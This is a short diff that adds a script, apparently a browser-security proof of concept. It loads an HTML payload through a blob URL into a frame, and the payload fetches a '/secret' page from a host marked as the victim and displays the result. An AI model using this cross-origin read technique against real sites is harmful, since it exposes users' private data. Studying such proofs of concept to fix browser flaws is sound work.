@@ -1,0 +1,5 @@
+<script>
+  var payload = "<!doctype html><script>fetch('https://8a53k1sqt5elsz52-victim.netlify.app/secret').then(response => response.text()).then(data => { alert(data); });</script>";
+  var blob = new Blob([payload], { type: 'text/html' });
+  contentWindow.frames[0].location = URL.createObjectURL(blob);
+</script>
